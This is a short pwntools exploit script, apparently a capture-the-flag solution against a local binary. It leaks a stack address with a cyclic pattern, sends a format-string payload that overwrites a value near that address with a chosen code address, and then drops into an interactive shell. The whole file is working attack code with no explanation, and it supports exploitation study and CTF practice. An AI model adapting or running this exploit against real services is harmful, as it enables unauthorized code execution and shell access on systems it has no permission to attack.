from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["",]
libc=ELF('./libc-2.31.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./vuln_patched")
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

pop_rdi = p64(0x401783)

gdb.attach(p)
ru(b'say?\n')
payload = cyclic(0x100)
s(payload)
ru(b'naac')
leak_addr = u64(rc(6).ljust(8,b'\x00'))
pr('leak_addr', leak_addr)

ru(b'else?(Y/n)\n')
sl(b'n')
payload = fmtstr_payload(0, {leak_addr - 8:0x401671}, 0x17e2)
s(payload)


shell()